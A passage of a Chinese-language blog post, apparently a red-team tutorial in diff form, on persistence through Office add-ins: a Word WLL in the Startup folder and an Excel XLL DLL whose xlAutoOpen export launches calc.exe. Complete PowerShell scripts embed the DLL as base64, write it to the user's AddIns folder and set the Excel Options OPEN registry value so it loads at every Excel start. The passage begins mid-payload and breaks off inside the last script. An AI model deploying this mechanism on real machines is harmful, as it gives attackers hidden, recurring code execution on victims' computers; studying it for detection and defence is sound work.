AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
+[System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\Word\Startup\calc.wll&quot;,$fileContentBytes)
+</code></pre><p>以上代码运行后，在<code>C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\</code>生成calc.wll，启动word.exe时,弹出计算器</p>
+<h2 id="0x03-Excel-XLL"><a href="#0x03-Excel-XLL" class="headerlink" title="0x03 Excel XLL"></a>0x03 Excel XLL</h2><hr>
+<h3 id="1、手动测试-1"><a href="#1、手动测试-1" class="headerlink" title="1、手动测试"></a>1、手动测试</h3><p>新建dll工程，添加导出函数xlAutoOpen，具体代码如下：</p>
+<pre><code>void xlAutoOpen()
+{
+    WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL);
+}
+
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:
+
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+</code></pre><p>添加文件，设置类型：Text File</p>
+<p>名称：工程同名文件.def</p>
+<p>写入：</p>
+<pre><code>EXPORTS
+xlAutoOpen
+</code></pre><p>编译成calc2.dll，导出函数为xlAutoOpen()，优化后大小为3kb</p>
+<p>重命名为calc.xll，保存路径如下：</p>
+<p><code>%appdata%\Microsoft\AddIns</code></p>
+<p>查找注册表键值：</p>
+<p>Office2010对应的键值为：</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code></p>
+<p>Office2013对应的键值为：</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options</code></p>
+<p>新建<code>字符串</code>值： <code>OPEN</code>： <code>/R calc.xll</code></p>
+<p>启动Excel.exe，弹出计算器，并且Excel正常启动</p>
+<h3 id="2、编写Powershell脚本实现-1"><a href="#2、编写Powershell脚本实现-1" class="headerlink" title="2、编写Powershell脚本实现"></a>2、编写Powershell脚本实现</h3><p>同上，calc2.dll作base64加密并存储于变量中：</p>
+<pre><code>$fileContent = [System.IO.File]::ReadAllBytes(&#39;calc.xll&#39;)
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calcxllbase64.txt&quot;) 
+</code></pre><p>得到</p>
+<p><code>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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
+<p>用变量$fileContent存储base64加密的calc.xll</p>
+<p>根据.xll文件的释放路径，base64解密并生成calc.xll的代码如下：</p>
+<pre><code>$fileContent = &quot;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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
+[System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\AddIns\calc.xll&quot;,$fileContentBytes)
+</code></pre><p>通过powershell判断office版本：</p>
+<p><code>dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot;</code></p>
+<p>回显： <code>Office14</code></p>
+<p>对字符串截取，截取出版本号14，代码如下：</p>
+<pre><code>$OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot;
+
+$Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) 
+</code></pre><p>加入异常捕获，如果系统未安装Office，返回提示信息：</p>
+<pre><code>Try  
+{  
+    $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop  
+    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) 
+}  
+Catch  
+{  
+    Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; 
+    Write-Host &quot;[+] Please reinput a correct path.&quot;  
+}  
+
+Write-Host &quot;Microsoft Office Version:&quot; $Ver
+</code></pre><p>拼接不同Office版本对应的注册表路径:</p>
+<p><code>$ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\Excel\&quot;</code></p>
+<p>新建键：Options</p>
+<p><code>New-Item -type Directory $ExcelRegPath&quot;Options&quot; | Out-Null</code></p>
+<p>新建字符串值： OPEN： /R calc.xll :</p>
+<p><code>New-ItemProperty $ExcelRegPath&quot;Options&quot; OPEN -value &quot;/R calc.xll&quot; -propertyType string | Out-Null</code></p>
+<p>完整代码如下：</p>
+<pre><code>$fileContent = &quot;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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
+[System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\AddIns\calc.xll&quot;,$fileContentBytes)
+
+Try  
+{  
+    $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop  
